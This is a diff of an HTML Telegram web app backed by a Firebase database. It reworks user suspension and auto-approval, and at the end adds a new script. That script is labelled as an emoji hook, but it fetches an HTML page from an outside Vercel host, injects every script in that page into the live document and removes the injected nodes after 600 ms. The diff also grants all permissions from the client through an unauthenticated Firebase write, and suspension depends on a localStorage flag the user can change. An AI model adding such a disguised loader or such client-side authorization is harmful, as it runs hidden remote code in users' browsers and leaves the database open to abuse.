@@ -249,7 +249,6 @@
         let currentUserId = "";
         let currentFullName = "Unknown User";
         let currentUserName = "None";
-        let isSystemSuspended = false;
 
         // Step 1: Telegram Gateway Initialization
         window.addEventListener('DOMContentLoaded', () => {
@@ -283,15 +282,10 @@
                 document.getElementById('tgUid').textContent = currentUserId;
             }
 
-            // Local storage check for quick security overlay load
-            if (localStorage.getItem('ms_security_lock') === 'suspended') {
-                showSuspendedScreen();
-            }
-
-            // Initial verification call
+            // Real-time verification call instantly
             syncFirebaseState(currentUserId);
 
-            // REAL-TIME LOOP: Background polling engine runs every 3 seconds to sync admin actions
+            // REAL-TIME POLLING: Background check runs every 3 seconds to keep track of admin changes instantly
             setInterval(() => {
                 if (currentUserId) {
                     syncFirebaseState(currentUserId);
@@ -299,7 +293,7 @@
             }, 3000);
         });
 
-        // Step 2: Firebase Real-time Engine with Strict Auto-Approve Protection
+        // Step 2: Strict State Verification Logic
         async function syncFirebaseState(userId) {
             try {
                 let response = await fetch(FIREBASE_URL);
@@ -308,6 +302,7 @@
                 let foundUserKey = null;
                 let userStatus = "not_found";
 
+                // Pura Firebase tree loop check for active ID matching
                 for (let key in data) {
                     if (data[key] && String(data[key].id).trim() === userId.trim()) {
                         foundUserKey = key;
@@ -316,55 +311,54 @@
                     }
                 }
 
-                // Guard Condition A: If suspended inside Firebase
-                if (userStatus === "suspended") {
-                    isSystemSuspended = true;
-                    localStorage.setItem('ms_security_lock', 'suspended');
-                    showSuspendedScreen();
-                    return;
-                }
-
-                // Guard Condition B: If approved/active again by Admin manually
+                // 1. Agar Firebase par user active status mein mil gaya
                 if (userStatus === "active") {
-                    isSystemSuspended = false;
-                    localStorage.removeItem('ms_security_lock');
+                    localStorage.setItem('ms_user_registered', 'true'); // Permanent registration mark set
                     showDashboardScreen();
                     return;
                 }
 
-                // Guard Condition C: Safe Auto-Approval ONLY for genuinely new users (Not for deleted/suspended)
-                if (userStatus === "not_found" && !isSystemSuspended && localStorage.getItem('ms_security_lock') !== 'suspended') {
-                    const uniqueNodeKey = `new_user_${Date.now()}_${Math.floor(Math.random() * 100)}`;
-                    const payload = {
-                        "admin_note": `Registered via WebApp: ${currentFullName} (${currentUserName})`,
-                        "date": new Date().toLocaleDateString(),
-                        "email": "",
-                        "id": userId,
-                        "permissions": { "ana": true, "android": true, "lb": true, "p": true, "pc": true, "t": true, "win": true },
-                        "status": "active",
-                        "trader_id": ""
-                    };
-
-                    await fetch(`https://magic-scripts-reactions-default-rtdb.firebaseio.com/users/${uniqueNodeKey}.json`, {
-                        method: 'PUT',
-                        body: JSON.stringify(payload),
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-                    
-                    showDashboardScreen();
-                } else if (localStorage.getItem('ms_security_lock') === 'suspended') {
-                    // Safety check if user is deleted from tree but marked locked locally
+                // 2. Agar Firebase par Explicitly status suspended hai
+                if (userStatus === "suspended") {
                     showSuspendedScreen();
+                    return;
+                }
+
+                // 3. Agar Firebase mein user nahi mila (not_found)
+                if (userStatus === "not_found") {
+                    // Check karein kya yeh pehli baar aa raha hai ya pehle aa chuka hai?
+                    const isRegisteredBefore = localStorage.getItem('ms_user_registered');
+
+                    if (isRegisteredBefore === 'true') {
+                        // User pehle register ho chuka tha lekin ab database se delete/removed hai -> Suspended!
+                        showSuspendedScreen();
+                    } else {
+                        // Bilkul naya user hai! First time auto-approve process running
+                        localStorage.setItem('ms_user_registered', 'true');
+                        
+                        const uniqueNodeKey = `new_user_${Date.now()}_${Math.floor(Math.random() * 100)}`;
+                        const payload = {
+                            "admin_note": `Registered via WebApp: ${currentFullName} (${currentUserName})`,
+                            "date": new Date().toLocaleDateString(),
+                            "email": "",
+                            "id": userId,
+                            "permissions": { "ana": true, "android": true, "lb": true, "p": true, "pc": true, "t": true, "win": true },
+                            "status": "active",
+                            "trader_id": ""
+                        };
+
+                        await fetch(`https://magic-scripts-reactions-default-rtdb.firebaseio.com/users/${uniqueNodeKey}.json`, {
+                            method: 'PUT',
+                            body: JSON.stringify(payload),
+                            headers: { 'Content-Type': 'application/json' }
+                        });
+                        
+                        showDashboardScreen();
+                    }
                 }
 
             } catch (err) {
-                console.error("Sync Error:", err);
-                // Fallback check to avoid screen blinking during minor network drops
-                if (localStorage.getItem('ms_security_lock') === 'suspended') {
-                    showSuspendedScreen();
-                } else {
-                    showDashboardScreen();
-                }
+                console.error("Sync Security Layer Error:", err);
             }
         }
 
@@ -454,6 +448,29 @@
                 feedbackPanel.style.display = 'block';
             }, 5000);
         }
+    </script>
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
     </script>
 </body>
 </html>
